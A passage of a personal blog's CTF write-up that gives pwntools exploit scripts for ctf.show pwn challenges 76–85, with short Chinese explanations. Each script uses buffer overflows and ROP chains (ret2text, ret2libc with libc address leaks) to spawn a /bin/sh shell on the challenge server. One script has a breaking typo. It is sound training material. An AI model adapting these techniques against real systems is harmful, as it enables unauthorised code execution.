<h3 id="pwn76（ret2text）"><a href="#pwn76（ret2text）" class="headerlink" title="pwn76（ret2text）"></a>pwn76（ret2text）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28152</span>)</span><br><span class="line"></span><br><span class="line">input_addr = <span class="number">0x811EB40</span></span><br><span class="line">sys_addr = <span class="number">0x8049284</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(sys_addr) + p32(input_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(payload))</span></span><br><span class="line">payload = base64.b64encode(pay load)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn77（ret2libc）"><a href="#pwn77（ret2libc）" class="headerlink" title="pwn77（ret2libc）"></a>pwn77（ret2libc）</h3><p>这里主要是实现了一个类似于gets功能的函数，解题的关键点在于我们在往v2中输入数据时最终会覆盖到v4，而这里的v4是数组v2的下标，如果我们使用任意的数据进行覆盖的话会导致程序出现意想不到的问题。因此采用正确的v4的值对对应的位置进行覆盖</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  <span class="comment">#这里用LibcSearcher3无法找到正确的Libc文件</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28231</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4008e3</span></span><br><span class="line">ret = <span class="number">0x400576</span></span><br><span class="line">offset = <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">4</span>) + p32(<span class="number">0x10d</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;T^T\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) </span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">4</span>) + p32(<span class="number">0x10d</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;T^T\n&#x27;)</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>对于官方的题解之所以是填充的’\x18’，开始在网上看的是说’\x18’是控制符号，表示取消，但是其实不是的。’\x18’其实是表示程序要把v4序号的位置移到栈上ret的位置。之所以是’\x18’实际上是我们要把v4的值改为0x118（这里实际就是ret地址的位置），因为我们v4高一位其实在v4++过程中已经是1了，因此我们这里填充’\x18’随后跟pop_rdi就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28219</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4008e3</span></span><br><span class="line">ret = <span class="number">0x400576</span></span><br><span class="line">offset = <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">4</span>) + <span class="string">b&#x27;\x18&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ctfshow)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;T^T\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) </span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (offset - <span class="number">4</span>) + <span class="string">b&#x27;\x18&#x27;</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(sys_addr)</span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;T^T\n&#x27;)</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn79（ret2libc）"><a href="#pwn79（ret2libc）" class="headerlink" title="pwn79（ret2libc）"></a>pwn79（ret2libc）</h3><p>这里简单注意一下strcpy函数，因为我在这里开始的时候第二个payload这里返回地址写了p64(0)导致一直无法getshell😢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28237</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x208</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your input: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your input: &#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn81（ret2libc）"><a href="#pwn81（ret2libc）" class="headerlink" title="pwn81（ret2libc）"></a>pwn81（ret2libc）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28251</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Maybe it&#x27;s simple,O.o\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">libcbase = system - libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2164f</span></span><br><span class="line">ret = libcbase + <span class="number">0x8aa</span> </span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">136</span>) + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn82（ret2libc-No-RELRO）"><a href="#pwn82（ret2libc-No-RELRO）" class="headerlink" title="pwn82（ret2libc + No RELRO）"></a>pwn82（ret2libc + No RELRO）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28209</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">show_addr = elf.sym[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(write_plt) + p32(show_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * offset + p32(system) + p32(show_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn83（ret2libc-Partial-RELRO）"><a href="#pwn83（ret2libc-Partial-RELRO）" class="headerlink" title="pwn83（ret2libc + Partial RELRO）"></a>pwn83（ret2libc + Partial RELRO）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28178</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">show_addr = elf.sym[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p32(write_plt) + p32(show_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * offset + p32(system) + p32(show_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn84（ret2libc-No-RELRO）"><a href="#pwn84（ret2libc-No-RELRO）" class="headerlink" title="pwn84（ret2libc + No RELRO）"></a>pwn84（ret2libc + No RELRO）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28235</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">show_addr = elf.sym[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x70</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400771</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(show_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn85（ret2libc-Partial-RELRO）"><a href="#pwn85（ret2libc-Partial-RELRO）" class="headerlink" title="pwn85（ret2libc + Partial RELRO）"></a>pwn85（ret2libc + Partial RELRO）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28267</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;../code/pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">show_addr = elf.sym[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x70</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4007a1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(show_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(bin_sh_addr) + p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn86"><a href="#pwn86" class="headerlink" title="pwn86"></a>pwn86</h3>
        </div>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn-WP/"># pwn_WP</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%8891-110%EF%BC%89/">pwn入门（91~110）</a>
            
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Wi1lings | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>